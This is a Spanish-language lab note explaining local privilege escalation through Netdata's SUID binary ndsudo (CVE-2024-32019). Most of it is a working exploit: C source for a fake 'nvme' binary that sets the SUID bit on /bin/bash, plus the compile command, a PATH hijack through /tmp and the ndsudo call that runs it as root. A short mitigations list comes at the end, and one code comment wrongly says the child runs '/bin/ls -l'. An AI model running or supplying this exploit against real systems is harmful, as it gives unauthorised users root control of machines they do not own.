# Escalada de Privilegios con ndsudo (CVE-2024-32019)

Este apunte documenta la técnica de **escalada de privilegios local** usando un binario vulnerable **`ndsudo`** de Netdata. Permite a un usuario con acceso local ejecutar código con privilegios **root** aprovechando una vulnerabilidad en la resolución de comandos externos.

---

## Condiciones para que `ndsudo` sea explotable

* El binario `ndsudo` debe estar **instalado en el sistema**.
* Debe tener **permisos SUID** (ejecutarse con privilegios del propietario, normalmente root).
* El usuario atacante debe poder **crear y ejecutar binarios locales** en un directorio que pueda añadir al **PATH**.
* El comando invocado por `ndsudo` (por ejemplo `nvme`) debe ser susceptible a **resolución a través de PATH** (no usar ruta absoluta fija).

---

## Flujo de explotación (PoC en laboratorio)

### 1. Código del payload (`nvme.c`)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <errno.h>

int main(void) {
    pid_t pid = fork();

    if (pid < 0) {
        perror("fork");
        return 1;
    }

    if (pid == 0) {
        /* Proceso hijo: reemplazamos con /bin/ls -l */
        char *argv[] = {"chmod","u+s","/bin/bash",  NULL};
        execvp(argv[0], argv);
        /* Si execvp falla, llegamos aquí */
        perror("execvp fallo");
        _exit(127);
    } else {
        /* Proceso padre: espera al hijo y muestra su estado */
        int status;
        if (waitpid(pid, &status, 0) == -1) {
            perror("waitpid");
            return 1;
        }
        if (WIFEXITED(status)) {
            printf("Hijo finalizó con estado %d\n", WEXITSTATUS(status));
        } else if (WIFSIGNALED(status)) {
            printf("Hijo terminado por señal %d\n", WTERMSIG(status));
        } else {
            printf("Hijo terminó de forma inesperada\n");
        }
    }

    return 0;
}

```

**Explicación rápida:**

* Da permisos SUID a la bash
---

### 2. Compilación del PoC

```bash
gcc -Wall -Wextra -o nvme nvme.c     
```

* Genera el binario `nvme` a partir del código fuente.

---

### 3. Transferencia y preparación

1. Mover el binario a un **directorio escribible**, por ejemplo `/tmp`:

```bash
mv nvme /tmp/
chmod +x /tmp/nvme
```

2. Añadir el directorio al **inicio del PATH**:

```bash
export PATH=/tmp:$PATH
```

* Esto asegura que `ndsudo` ejecutará nuestro `nvme` en lugar del binario legítimo.

---

### 4. Ejecución controlada

```bash
./ndsudo nvme-list
```

* `ndsudo` invocará nuestro PoC **con privilegios root**.
* Comprobación: verificar permisos de la bash:

```bash
ls -l /bin/bash
```

---

### 5. Mitigaciones

* **Eliminar SUID innecesario:** revisar binarios instalados con SUID.
* **Actualizar Netdata:** instalar la versión que corrige CVE-2024-32019.
* **Evitar dependencia de PATH en binarios privilegiados:** usar rutas absolutas para comandos críticos.
* **Auditar directorios del PATH:** limitar escritura de usuarios no privilegiados en directorios incluidos en PATH de SUID.

---

### Resumen

* **Vulnerabilidad:** `ndsudo` permite ejecutar comandos locales con privilegios root al resolver binarios externos mediante PATH.
* **Impacto:** Escalada de privilegios local.
* **Requisitos:** `ndsudo` SUID, usuario con permisos de escritura en PATH, comandos invocados susceptibles a PATH.
---
